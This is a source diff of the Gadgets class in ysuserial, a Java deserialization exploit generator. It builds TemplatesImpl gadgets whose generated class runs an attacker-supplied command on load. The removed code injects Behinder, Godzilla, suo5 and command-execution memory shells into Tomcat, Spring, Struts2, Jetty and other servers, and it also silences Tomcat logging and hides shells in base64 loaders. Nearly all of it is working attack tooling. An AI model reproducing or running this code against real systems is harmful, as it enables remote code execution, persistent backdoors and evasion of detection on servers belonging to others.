@@ -1,13 +1,14 @@
 package org.su18.ysuserial.payloads.util;
 
-
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 import static org.su18.ysuserial.payloads.config.Config.*;
-import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
-import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
+import static org.su18.ysuserial.payloads.handle.ClassFieldHandler.insertField;
+import static org.su18.ysuserial.payloads.handle.ClassMethodHandler.*;
+import static org.su18.ysuserial.payloads.handle.ClassNameHandler.generateClassName;
+import static org.su18.ysuserial.payloads.handle.GlassHandler.generateClass;
+import static org.su18.ysuserial.payloads.handle.GlassHandler.shrinkBytes;
 import static org.su18.ysuserial.payloads.util.Utils.*;
 
-import java.io.FileInputStream;
 import java.lang.reflect.*;
 import java.util.*;
 
@@ -16,9 +17,6 @@ import javassist.*;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import javassist.bytecode.*;
-import org.apache.commons.codec.binary.Base64;
-import org.apache.commons.lang.StringUtils;
 
 
 @SuppressWarnings({
@@ -26,9 +24,11 @@ import org.apache.commons.lang.StringUtils;
 })
 public class Gadgets {
 
-	public static String memShellClassname = "";
+	public static Class TPL_CLASS = TemplatesImpl.class;
 
-	public static byte[] memShellClassBytes = null;
+	public static Class ABST_TRANSLET = AbstractTranslet.class;
+
+	public static Class TRANS_FACTORY = TransformerFactoryImpl.class;
 
 	static {
 		// special case for using TemplatesImpl gadgets with a SecurityManager enabled
@@ -36,6 +36,16 @@ public class Gadgets {
 
 		// for RMI remote loading
 		System.setProperty("java.rmi.server.useCodebaseOnly", "false");
+
+		try {
+			// 兼容不同 JDK 版本
+			if (Boolean.parseBoolean(System.getProperty("properXalan", "false")) || FORCE_USING_ORG_APACHE_TEMPLATESIMPL) {
+				TPL_CLASS = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
+				ABST_TRANSLET = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+				TRANS_FACTORY = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
+			}
+		} catch (Exception ignored) {
+		}
 	}
 
 	public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
@@ -70,249 +80,56 @@ public class Gadgets {
 	public static Object createTemplatesImpl(String command) throws Exception {
 		command = command.trim();
 
-		String   packageName = "org.su18.ysuserial.payloads.templates.";
-		Class<?> clazz;
-		Class    tplClass;
-		Class    abstTranslet;
-		Class    transFactory;
-
-		// 兼容不同 JDK 版本
-		if (Boolean.parseBoolean(System.getProperty("properXalan", "false")) || FORCE_USING_ORG_APACHE_TEMPLATESIMPL) {
-			tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
-			abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-			transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
-		} else {
-			tplClass = TemplatesImpl.class;
-			abstTranslet = AbstractTranslet.class;
-			transFactory = TransformerFactoryImpl.class;
-		}
-
 		// 支持单双引号
 		if (command.startsWith("'") || command.startsWith("\"")) {
 			command = command.substring(1, command.length() - 1);
 		}
 
+		CtClass ctClass      = null;
+		byte[]  classBytes   = new byte[0];
+		String  newClassName = generateClassName();
 
-		// 如果命令以 EX- 开头（Extra 特殊功能），根据想使用的不同类获取不同的 class 模板进行加载获取不同的功能
-		if (command.startsWith("EX-")) {
-			command = command.substring(3);
-			String type = "";
-			String name = "";
+		final Object templates = TPL_CLASS.newInstance();
+		POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
+		CtClass superClass = POOL.get(ABST_TRANSLET.getName());
 
-			// 如果命令以 MS 开头，则代表是注入内存马
-			if (command.startsWith("MS-")) {
-				command = command.substring(3);
-				packageName += "memshell.";
-				String prefix = command.substring(0, 2).toLowerCase();
-
-				if ("tf".equals(prefix) || "tl".equals(prefix) || "ts".equals(prefix) || "tw".equals(prefix) ||
-						"te".equals(prefix) || "tu".equals(prefix)) {
-					packageName += "tomcat.";
-				} else if ("sp".equals(prefix)) {
-					packageName += "spring.";
-				} else if ("st".equals(prefix)) {
-					packageName += "struts2.";
-				} else if ("jf".equals(prefix) || "js".equals(prefix)) {
-					packageName += "jetty.";
-				} else if ("rf".equals(prefix) || "rs".equals(prefix)) {
-					packageName += "resin.";
-				} else if ("jb".equals(prefix)) {
-					packageName += "jboss.";
-				} else if ("ws".equals(prefix)) {
-					packageName += "websphere.";
-				}
-
-				if (command.contains("-")) {
-					String[] commands = command.split("[-]");
-					name = commands[0];
-					type = command.substring(command.indexOf("-") + 1);
-				} else {
-					name = command;
-				}
-
-				clazz = Class.forName(packageName + name, false, Gadgets.class.getClassLoader());
-			} else {
-
-				if (command.endsWith("Echo")) {
-					packageName += "echo.";
-				}
-
-				// 这里不能让它初始化，不然从线程中获取 WebappClassLoaderBase 时会强制类型转换异常。
-				clazz = Class.forName(packageName + command, false, Gadgets.class.getClassLoader());
-			}
-
-			return createTemplatesImpl(clazz, null, null, type, tplClass, abstTranslet, transFactory);
-			// 如果命令以 LF- 开头 （Local File），则程序可以生成一个能加载本地指定类字节码并初始化的逻辑，后面跟文件路径-类名
-		} else if (command.startsWith("LF-")) {
-			String className;
-			command = command.substring(3);
-			String[] cmd = command.split("[-]");
-
-			ClassPool pool    = ClassPool.getDefault();
-			CtClass   ctClass = pool.makeClass(new FileInputStream(cmd[0]));
-
-			if (cmd.length > 1) {
-				className = cmd[1];
-			} else {
-				className = ctClass.getName();
-			}
-
-			shrinkBytes(ctClass);
-			return createTemplatesImpl(null, null, ctClass.toBytecode(), className, tplClass, abstTranslet, transFactory);
+		// 扩展功能
+		if (command.startsWith("EX-") || command.startsWith("LF-")) {
+			ctClass = generateClass(command, newClassName);
 		} else {
-			// 否则就是普通的命令执行
-			return createTemplatesImpl(null, command, null, null, tplClass, abstTranslet, transFactory);
-		}
-	}
-
-
-	public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, String cName, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
-		final T   templates    = tplClass.newInstance();
-		byte[]    classBytes   = new byte[0];
-		ClassPool pool         = ClassPool.getDefault();
-		String    newClassName = generateClassName();
-
-		pool.insertClassPath(new ClassClassPath(abstTranslet));
-		CtClass superClass = pool.get(abstTranslet.getName());
-
-		CtClass ctClass = null;
-
-		// 如果 Command 不为空，则是普通的命令执行
-		if (command != null) {
+			// 普通的命令执行
 			if (IS_OBSCURE) {
-				ctClass = pool.makeClass(newClassName);
+				ctClass = POOL.makeClass(newClassName);
 				insertCMD(ctClass);
 				CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
 				ctConstructor.setBody("{execCmd(\"" + command + "\");}");
 				ctClass.addConstructor(ctConstructor);
 			} else {
 				// 最短化
-				ctClass = pool.makeClass(newClassName);
+				ctClass = POOL.makeClass(newClassName);
 				CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
 				ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
 				ctClass.addConstructor(ctConstructor);
 			}
+		}
 
-			// 如果全局配置继承，再设置父类
-			if (IS_INHERIT_ABSTRACT_TRANSLET) {
+		// 如果全局配置继承，再设置父类
+		if (IS_INHERIT_ABSTRACT_TRANSLET) {
+			shrinkBytes(ctClass);
+
+			// 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
+			if (!"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
+				ctClass = encapsulationByClassLoaderTemplate(ctClass.toBytecode(), newClassName);
+			} else {
+				// 否则直接设置父类
+				ctClass.defrost();
 				ctClass.setSuperclass(superClass);
 			}
 		}
 
-		// 如果 myClass 不为空，则说明指定了一些 Class 执行特殊功能
-		if (myClass != null) {
-			String className = myClass.getName();
-			ctClass = pool.get(className);
-
-			// 为 DefineClassFromParameter 添加自定义函数功能
-			if (className.endsWith("DefineClassFromParameter")) {
-				insertField(ctClass, "parameter", "public static String parameter = \"" + PARAMETER + "\";");
-			} else if (className.endsWith("Echo")) {
-				insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = \"" + CMD_HEADER_STRING + "\";");
-				// 动态为 Echo回显类 添加执行命令功能
-				insertCMD(ctClass);
-				ctClass.getDeclaredMethod("q").setBody("{return execCmd($1);}");
-
-			} else if (className.contains("RMIBindTemplate")) {
-				// 如果是 RMI 内存马，则修改其中的 registryPort、bindPort、serviceName，插入关键方法
-
-				if (IS_INHERIT_ABSTRACT_TRANSLET) {
-					ctClass.setSuperclass(superClass);
-				}
-
-				String[] parts = cName.split("-");
-
-				if (parts.length < 3) {
-					// BindPort 写 0 就是随机端口
-					throw new IllegalArgumentException("Command format is: EX-MS-RMIBindTemplate-<RegistryPort>-<BindPort>-<ServiceName>");
-				}
-
-				// 插入关键参数
-				String rPortString = "port=" + parts[0] + ";";
-				ctClass.makeClassInitializer().insertBefore(rPortString);
-				String bPort = "bindPort=" + parts[1] + ";";
-				ctClass.makeClassInitializer().insertBefore(bPort);
-				String sName = "serviceName=\"" + parts[2] + "\";";
-				ctClass.makeClassInitializer().insertBefore(sName);
-
-				ctClass.setInterfaces(new CtClass[]{pool.get("javax.management.remote.rmi.RMIConnection"), pool.get("java.io.Serializable")});
-
-				// 插入目标执行类
-				insertCMD(ctClass);
-				ctClass.addMethod(CtMethod.make("public String getDefaultDomain(javax.security.auth.Subject subject) throws java.io.IOException {return new String(execCmd(((java.security.Principal)subject.getPrincipals().iterator().next()).getName()).toByteArray());}", ctClass));
-
-			} else {
-				if (className.contains("WSMS")) {
-					insertKeyMethod(ctClass, "ws");
-				} else if (className.contains("UGMS")) {
-					insertKeyMethod(ctClass, "upgrade");
-				} else if (className.contains("EXMS")) {
-					insertKeyMethod(ctClass, "execute");
-				} else if (StringUtils.isNotEmpty(cName)) {
-					insertKeyMethod(ctClass, cName);
-				}
-			}
-
-			ctClass.setName(newClassName);
-
-			if (IS_INHERIT_ABSTRACT_TRANSLET) {
-				shrinkBytes(ctClass);
-
-				// 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
-				if (myClass.getSuperclass() != Object.class) {
-					bytes = ctClass.toBytecode();
-					cName = ctClass.getName();
-				} else {
-					// 否则直接设置父类
-					ctClass.setSuperclass(superClass);
-				}
-			}
-
-			// Struts2ActionMS 额外处理
-			if (className.contains("Struts2ActionMS")) {
-				insertField(ctClass, "thisClass", "public static String thisClass = \"" + base64Encode(ctClass.toBytecode()) + "\";");
-			}
-		}
-
-		// 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
-		if (bytes != null) {
-			ctClass = encapsulationByClassLoaderTemplate(bytes, cName, IS_INHERIT_ABSTRACT_TRANSLET ? superClass : null);
-		}
-
-
-		shrinkBytes(ctClass);
+		// 按需保存文件
+		saveCtClassToFile(ctClass);
 		classBytes = ctClass.toBytecode();
-
-		if (HIDE_MEMORY_SHELL) {
-			switch (HIDE_MEMORY_SHELL_TYPE) {
-				case 1:
-					break;
-				case 2:
-					CtClass newClass = pool.get("org.su18.ysuserial.payloads.templates.HideMemShellTemplate");
-					newClass.setName(generateClassName());
-					String content = "b64=\"" + Base64.encodeBase64String(classBytes) + "\";";
-					String className = "className=\"" + ctClass.getName() + "\";";
-					newClass.defrost();
-					newClass.makeClassInitializer().insertBefore(content);
-					newClass.makeClassInitializer().insertBefore(className);
-
-					if (IS_INHERIT_ABSTRACT_TRANSLET) {
-						newClass.setSuperclass(superClass);
-					}
-
-					classBytes = newClass.toBytecode();
-					break;
-			}
-		}
-
-		// 保存内存马文件
-		if (GEN_MEM_SHELL) {
-			if (StringUtils.isNotEmpty(GEN_MEM_SHELL_FILENAME)) {
-				writeClassToFile(GEN_MEM_SHELL_FILENAME, classBytes);
-			} else {
-				writeClassToFile(ctClass.getName() + ".class", classBytes);
-			}
-		}
 
 		// 加载 class 试试
 //		loadClassTest(classBytes, ctClass.getName());
@@ -320,16 +137,11 @@ public class Gadgets {
 		// 写入前将 classBytes 中的类标识设为 JDK 1.6 的版本号
 		classBytes[7] = 49;
 
-		// 储存一下生成的内存马类名及类字节码，用来给 TransformerUtil 用
-		memShellClassBytes = classBytes;
-		memShellClassname = ctClass.getName();
-
 		// 恶意类是否继承 AbstractTranslet
 		if (IS_INHERIT_ABSTRACT_TRANSLET) {
-			// inject class bytes into instance
 			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
 		} else {
-			CtClass newClass = pool.makeClass(generateClassName());
+			CtClass newClass = POOL.makeClass(generateClassName());
 			insertField(newClass, "serialVersionUID", "private static final long serialVersionUID = 8207363842866235160L;");
 
 			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, newClass.toBytecode()});
@@ -339,10 +151,9 @@ public class Gadgets {
 
 		// required to make TemplatesImpl happy
 		Reflections.setFieldValue(templates, "_name", "a");
-		Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+		Reflections.setFieldValue(templates, "_tfactory", TRANS_FACTORY.newInstance());
 		return templates;
 	}
-
 
 	public static HashMap makeMap(Object v1, Object v2) throws Exception {
 		HashMap s = new HashMap();
@@ -361,253 +172,5 @@ public class Gadgets {
 		Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
 		Reflections.setFieldValue(s, "table", tbl);
 		return s;
-	}
-
-	public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {
-
-		// 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
-		String name = ctClass.getName();
-		name = name.substring(name.lastIndexOf(".") + 1);
-
-		// 大多数 SpringBoot 项目使用内置 Tomcat
-		boolean isTomcat  = name.startsWith("T") || name.startsWith("Spring");
-		boolean isWebflux = name.contains("Webflux");
-
-		// 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
-		String method = "";
-		if (name.contains("SpringControllerMS")) {
-			method = "drop";
-		} else if (name.contains("Struts2ActionMS")) {
-			method = "executeAction";
-		}
-
-		List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
-		classes.add(ctClass.getSuperclass());
-
-		for (CtClass value : classes) {
-			String className = value.getName();
-			if (KEY_METHOD_MAP.containsKey(className)) {
-				method = KEY_METHOD_MAP.get(className);
-				break;
-			}
-		}
-
-		// 命令执行、各种内存马
-		insertField(ctClass, "HEADER_KEY", "public static String HEADER_KEY=" + converString(HEADER_KEY) + ";");
-		insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=" + converString(HEADER_VALUE) + ";");
-
-		if ("bx".equals(type)) {
-			insertBase64Decode(ctClass);
-			insertGetFieldValue(ctClass);
-			insertGetMethodAndInvoke(ctClass);
-
-			if (IS_OBSCURE) {
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
-			}
-
-			String shell = "";
-			if (isTomcat) {
-				insertTomcatNoLog(ctClass);
-				shell = IS_OBSCURE ? BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : BEHINDER_SHELL_FOR_TOMCAT;
-			} else {
-				shell = IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
-			}
-
-			insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD));
-		} else if ("gz".equals(type)) {
-			insertField(ctClass, "payload", "Class payload ;");
-			insertField(ctClass, "xc", "String xc = " + converString(GODZILLA_KEY) + ";");
-			insertField(ctClass, "PASS", "String PASS = " + converString(PASSWORD_ORI) + ";");
-
-			insertBase64Decode(ctClass);
-			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(MD5), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
-			insertTomcatNoLog(ctClass);
-			if (isWebflux) {
-				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL_FOR_WEBFLUX));
-			} else {
-				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL));
-			}
-		} else if ("gzraw".equals(type)) {
-			insertField(ctClass, "payload", "Class payload ;");
-			insertField(ctClass, "xc", "String xc = " + converString(GODZILLA_KEY) + ";");
-
-			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
-			insertTomcatNoLog(ctClass);
-			insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL));
-		} else if ("suo5".equals(type)) {
-
-			// 先写入一些需要的基础属性
-			insertField(ctClass, "gInStream", "java.io.InputStream gInStream;");
-			insertField(ctClass, "gOutStream", "java.io.OutputStream gOutStream;");
-
-			// 依次写入方法
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_CREATE), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_DATA), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_DEL), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_SET_STREAM), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_STATUS), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_U32_TO_BYTES), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_BYTES_TO_U32), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_MARSHAL), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_UNMARSHAL), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_READ_SOCKET), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_READ_INPUT_STREAM_WITH_TIMEOUT), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_TRY_FULL_DUPLEX), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_READ_REQ), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_PROCESS_DATA_UNARY), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_PROCESS_DATA_BIO), ctClass));
-
-			// 为恶意类设置 Runnable 接口以及 RUN 方法
-			CtClass runnableClass = ClassPool.getDefault().get("java.lang.Runnable");
-			ctClass.addInterface(runnableClass);
-			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.RUN), ctClass));
-
-			// 插入关键方法
-			insertMethod(ctClass, method, base64Decode(SUO5.SUO5));
-		} else if ("execute".equals(type)) {
-			insertField(ctClass, "TAG", "public static String TAG = \"" + CMD_HEADER_STRING + "\";");
-			insertCMD(ctClass);
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_REQUEST), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_RESPONSE), ctClass));
-
-			insertMethod(ctClass, method, base64Decode(EXECUTOR_SHELL));
-		} else if ("ws".equals(type)) {
-			insertCMD(ctClass);
-			insertMethod(ctClass, method, base64Decode(WS_SHELL));
-		} else if ("upgrade".equals(type)) {
-			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");
-			insertGetFieldValue(ctClass);
-			insertCMD(ctClass);
-			insertMethod(ctClass, method, base64Decode(UPGRADE_SHELL));
-		} else {
-			insertCMD(ctClass);
-			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");
-
-			if (isWebflux) {
-				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_WEBFLUX));
-			} else if (isTomcat) {
-				insertTomcatNoLog(ctClass);
-				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT));
-			} else {
-				insertGetMethodAndInvoke(ctClass);
-				insertMethod(ctClass, method, base64Decode(CMD_SHELL));
-			}
-		}
-
-		ctClass.setName(generateClassName());
-		insertField(ctClass, "pattern", "public static String pattern = " + converString(URL_PATTERN) + ";");
-
-	}
-
-	public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
-		// 根据传入的不同参数，在不同方法中插入不同的逻辑
-		CtMethod cm = ctClass.getDeclaredMethod(method);
-		cm.insertBefore(payload);
-	}
-
-	/**
-	 * 向指定类中写入命令执行方法 execCmd
-	 * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
-	 *
-	 * @param ctClass 指定类
-	 * @throws Exception 抛出异常
-	 */
-	public static void insertCMD(CtClass ctClass) throws Exception {
-		if (IS_OBSCURE) {
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(TO_CSTRING_Method), ctClass));
-			insertGetMethodAndInvoke(ctClass);
-			insertGetFieldValue(ctClass);
-			ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD_OBSCURE), ctClass));
-		} else {
-			ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD), ctClass));
-		}
-	}
-
-	public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
-		ctClass.defrost();
-		try {
-			CtField ctSUID = ctClass.getDeclaredField(fieldName);
-			ctClass.removeField(ctSUID);
-		} catch (javassist.NotFoundException ignored) {
-		}
-		ctClass.addField(CtField.make(fieldCode, ctClass));
-	}
-
-
-	public static void insertBase64Decode(CtClass ctClass) throws Exception {
-		try {
-			ctClass.getDeclaredMethod("base64Decode");
-		} catch (NotFoundException e) {
-			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
-		}
-	}
-
-	public static void insertGetFieldValue(CtClass ctClass) throws Exception {
-		try {
-			ctClass.getDeclaredMethod("getFieldValue");
-		} catch (NotFoundException e) {
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
-		}
-	}
-
-	public static void insertGetMethodAndInvoke(CtClass ctClass) throws Exception {
-		try {
-			ctClass.getDeclaredMethod("getMethodByClass");
-		} catch (NotFoundException e) {
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
-		}
-
-		try {
-			ctClass.getDeclaredMethod("getMethodAndInvoke");
-		} catch (NotFoundException e) {
-			if (IS_OBSCURE) {
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
-			} else {
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
-			}
-		}
-	}
-
-	public static void insertTomcatNoLog(CtClass ctClass) throws Exception {
-		insertGetFieldValue(ctClass);
-		insertGetMethodAndInvoke(ctClass);
-		ctClass.addMethod(CtMethod.make(base64Decode(TOMCAT_NO_LOG), ctClass));
-	}
-
-	// 恶心一下人，实际没用
-	public static String converString(String target) {
-		if (IS_OBSCURE) {
-			StringBuilder result = new StringBuilder("new String(new byte[]{");
-			byte[]        bytes  = target.getBytes();
-			for (int i = 0; i < bytes.length; i++) {
-				result.append(bytes[i]).append(",");
-			}
-			return result.substring(0, result.length() - 1) + "})";
-		}
-
-		return "\"" + target + "\"";
-	}
-
-
-	// 统一处理，删除一些不影响使用的 Attribute 降低类字节码的大小
-	public static void shrinkBytes(CtClass ctClass) {
-		ClassFile classFile = ctClass.getClassFile2();
-		classFile.removeAttribute(SourceFileAttribute.tag);
-		classFile.removeAttribute(LineNumberAttribute.tag);
-		classFile.removeAttribute(LocalVariableAttribute.tag);
-		classFile.removeAttribute(LocalVariableAttribute.typeTag);
-		classFile.removeAttribute(DeprecatedAttribute.tag);
-		classFile.removeAttribute(SignatureAttribute.tag);
-		classFile.removeAttribute(StackMapTable.tag);
-
-		List<MethodInfo> list = classFile.getMethods();
-		for (MethodInfo info : list) {
-			info.removeAttribute("RuntimeVisibleAnnotations");
-			info.removeAttribute("RuntimeInvisibleAnnotations");
-		}
 	}
 }
